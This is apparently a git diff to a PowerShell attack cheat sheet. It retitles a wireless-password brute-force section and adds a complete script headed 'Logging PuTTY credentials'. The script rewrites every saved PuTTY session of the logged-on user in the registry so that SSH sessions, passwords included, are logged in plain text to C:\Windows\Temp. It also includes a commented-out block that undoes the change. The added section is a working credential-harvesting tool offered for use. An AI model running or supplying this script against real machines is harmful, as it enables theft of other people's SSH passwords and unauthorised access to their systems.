@@ -266,7 +266,7 @@ $wp.foreach({
 
 ```netsh wlan show networks mode=bssid```
 
-## Slow on-line brute-force wireless password in powershell
+## Slow on-line brute-force wireless password using powershell
 
 ```powershell
 $ssid = "iPhone"
@@ -347,5 +347,65 @@ foreach($key in $wordlist)
       Exit
    }
    netsh wlan delete profile name="BruteForce" | Out-Null
+}
+```
+
+## Logging PuTTY credentials using powershell
+
+```powershell
+$user = Get-WMIObject -class Win32_ComputerSystem | select -ExpandProperty username
+if(!$user)
+{
+   Write-Host "Currently logged on user not identified."
+   Exit
+}
+Write-Host "Currently logged on user = $user"
+$sidu = (New-Object System.Security.Principal.NTAccount($user)).Translate([System.Security.Principal.SecurityIdentifier]).value
+if(!$sidu)
+{
+   Write-Host "User SID not identified."
+   Exit
+}
+$putty = Test-Path -Path "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
+if($putty -eq $False)
+{
+   Write-Host "No PuTTY sessions identified."
+   Exit
+}
+$sess = Get-ChildItem "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
+if(!$sess)
+{
+   Write-Host "No PuTTY sessions identified."
+   Exit
+}
+$skey = $sess | Foreach-Object {Get-ItemProperty $_.PsPath}
+$snum = 0
+Foreach($item in $skey)
+{
+   $rkey = Convert-Path $item.PsPath
+   $rkey = "REGISTRY::$rkey"
+   New-ItemProperty -Path "$rkey" -Name "LogFileName" -Value "C:\Windows\Temp\puttylog$snum.log" -Type String -Force | Out-Null
+   New-ItemProperty -Path "$rkey" -Name "LogFlush" -Value 1 -Type DWord -Force | Out-Null
+   New-ItemProperty -Path "$rkey" -Name "LogType" -Value 3 -Type DWord -Force | Out-Null
+   New-ItemProperty -Path "$rkey" -Name "LogFileClash" -Value 0 -Type DWord -Force | Out-Null
+   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitData" -Value 0 -Type DWord -Force | Out-Null
+   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitPasswords" -Value 0 -Type DWord -Force | Out-Null
+   <# to remove logging
+   New-ItemProperty -Path "$rkey" -Name "LogFileName" -Value "" -Type String -Force | Out-Null
+   New-ItemProperty -Path "$rkey" -Name "LogFlush" -Value 0 -Type DWord -Force | Out-Null
+   New-ItemProperty -Path "$rkey" -Name "LogType" -Value 0 -Type DWord -Force | Out-Null
+   New-ItemProperty -Path "$rkey" -Name "LogFileClash" -Value 1 -Type DWord -Force | Out-Null
+   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitData" -Value 1 -Type DWord -Force | Out-Null
+   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitPasswords" -Value 1 -Type DWord -Force | Out-Null
+   #>
+   $snum++
+}
+if($snum -gt 0)
+{
+   Write-Host "$snum PuTTY session(s) were configured to log credentials."
+}
+else
+{
+   Write-Host "There were no PuTTY sessions to configure."
 }
 ```
